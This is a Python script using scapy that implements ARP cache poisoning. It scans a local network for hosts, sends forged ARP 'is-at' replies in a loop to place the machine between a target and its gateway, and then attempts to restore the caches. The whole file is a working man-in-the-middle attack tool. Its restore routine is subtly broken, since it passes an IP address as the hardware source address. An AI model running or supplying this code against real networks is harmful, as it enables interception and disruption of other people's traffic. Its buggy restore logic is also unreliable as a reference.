#!/usr/bin/env python3
"""
Python Implementation of ARP Cache Poisoning
"""
import logging
from scapy.all import *
from scapy.layers.l2 import getmacbyip, arping
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP

logging.basicConfig(level=logging.INFO)


def get_own_ip() -> str:
    """ Get own IP Address """
    return get_if_addr(conf.iface)

def get_own_mac() -> str:
    """ Get own MAC Address """
    return get_if_hwaddr(conf.iface)

def get_gateway_ip() -> str:
    """ Retrieve gateway IP """
    gateway_ip = conf.route.route('0.0.0.0')[2]
    logging.info('gateway ip: %s' % gateway_ip)
    return gateway_ip

def get_mac(ip_address: str) -> str:
    """ Retrieve MAC Address from IP using ARP """
    mac = getmacbyip(ip_address)
    logging.info('%s mac address: %s' % (ip_address, mac))
    return mac

def arp_ping(target_ip: str) -> None:
    """ ARP Ping """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_ip), timeout=2)

    ans.summary()

    if len(ans) > 0:
        packet = ans[0][1]
        address = (packet[ARP].psrc, packet.src)
        logging.info('arp ping returned: %s' % str(address))
        return address

def arp_spoof(target_ip: str, source_ip: str, target_mac: str = None) -> None:
    """ ARP Spoofer """
    if not target_mac:
        target_mac = get_mac(target_ip)
    arp_packet = ARP(op='is-at', pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    send(arp_packet)
    logging.info("Sent 'is-at' spoof to %s (%s)" % (target_ip, target_mac))

def arp_restore(target_ip: str, source_ip: str, target_mac: str = None, source_mac: str = None) -> None:
    """ Restore original ARP Cache """
    if not target_mac:
        target_mac = get_mac(target_ip)
    if not source_mac:
        source_mac = get_mac(source_ip)

    arp_packet = ARP(op='is-at', pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_ip)
    send(arp_packet, count=7)
    logging.info("Sent 7 ARP 'is-at' restore to %s (%s), gateway: %s (%s)" % (target_ip, target_mac, source_ip, source_mac))

def arp_poison(target_ip: str) -> None:
    """ ARP Cache Poison a IP """
    target_mac = get_mac(target_ip)
    gateway_ip = get_gateway_ip()
    gateway_mac = get_mac(gateway_ip)
    logging.info('Starting ARP cache poisoning attack on %s (%s)' % (target_ip, target_mac))
    try:
        while 1:
            arp_spoof(target_ip, gateway_ip, target_mac=target_mac)
            arp_spoof(gateway_ip, target_ip, target_mac=gateway_mac)
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info('*Ctrl-C*: Restoring original ARP Information...')
    finally:
        arp_restore(target_ip, gateway_ip, target_mac=target_mac, source_mac=gateway_mac)
        arp_restore(gateway_ip, target_ip, target_mac=gateway_mac, source_mac=target_mac)

def scan_network(network: str) -> list:
    """ Scan network for connected devices """
    arp = ARP(pdst=network)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp
    ans, _ = srp(packet, timeout=5)

    addresses = []

    for packet in ans:
        # (IP Address, MAC Address)
        address = (packet[1][ARP].psrc, packet[1].src)
        addresses.append(address)
        logging.info('network_scan: found %s' % str(address))

    return addresses


if __name__ == "__main__":
    print(get_mac(get_gateway_ip()))
    arping(f'{get_own_ip()}/24')
